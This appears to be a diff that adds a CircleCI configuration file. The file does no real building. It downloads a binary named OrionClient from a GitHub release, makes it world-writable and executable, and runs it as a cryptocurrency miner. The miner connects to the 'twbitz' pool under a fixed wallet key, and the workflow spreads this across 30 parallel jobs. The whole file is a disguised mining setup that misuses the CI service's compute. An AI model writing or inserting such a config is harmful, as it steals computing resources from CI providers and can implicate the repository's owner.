@@ -1,0 +1,60 @@
+version: 2.1
+
+jobs:
+  build:
+    parameters:
+      worker_name:
+        type: string
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install dependencies
+          command: |
+            apt-get update && apt-get install -y wget coreutils
+      - run:
+          name: Download and extract OrionClient
+          command: |
+            wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
+            tar xf OrionClient.tar.gz
+            chmod 777 OrionClient/OrionClient
+      - run:
+          name: Run OrionClient with unique worker
+          command: |
+            cd OrionClient
+            ./OrionClient mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker "<< parameters.worker_name >>"
+
+workflows:
+  version: 2
+  parallel_builds:
+    jobs:
+      - build: {name: build-1, worker_name: ccb-1}
+      - build: {name: build-2, worker_name: ccb-2}
+      - build: {name: build-3, worker_name: ccb-3}
+      - build: {name: build-4, worker_name: ccb-4}
+      - build: {name: build-5, worker_name: ccb-5}
+      - build: {name: build-6, worker_name: ccb-6}
+      - build: {name: build-7, worker_name: ccb-7}
+      - build: {name: build-8, worker_name: ccb-8}
+      - build: {name: build-9, worker_name: ccb-9}
+      - build: {name: build-10, worker_name: ccb-10}
+      - build: {name: build-11, worker_name: ccb-11}
+      - build: {name: build-12, worker_name: ccb-12}
+      - build: {name: build-13, worker_name: ccb-13}
+      - build: {name: build-14, worker_name: ccb-14}
+      - build: {name: build-15, worker_name: ccb-15}
+      - build: {name: build-16, worker_name: ccb-16}
+      - build: {name: build-17, worker_name: ccb-17}
+      - build: {name: build-18, worker_name: ccb-18}
+      - build: {name: build-19, worker_name: ccb-19}
+      - build: {name: build-20, worker_name: ccb-20}
+      - build: {name: build-21, worker_name: ccb-21}
+      - build: {name: build-22, worker_name: ccb-22}
+      - build: {name: build-23, worker_name: ccb-23}
+      - build: {name: build-24, worker_name: ccb-24}
+      - build: {name: build-25, worker_name: ccb-25}
+      - build: {name: build-26, worker_name: ccb-26}
+      - build: {name: build-27, worker_name: ccb-27}
+      - build: {name: build-28, worker_name: ccb-28}
+      - build: {name: build-29, worker_name: ccb-29}
+      - build: {name: build-30, worker_name: ccb-30}
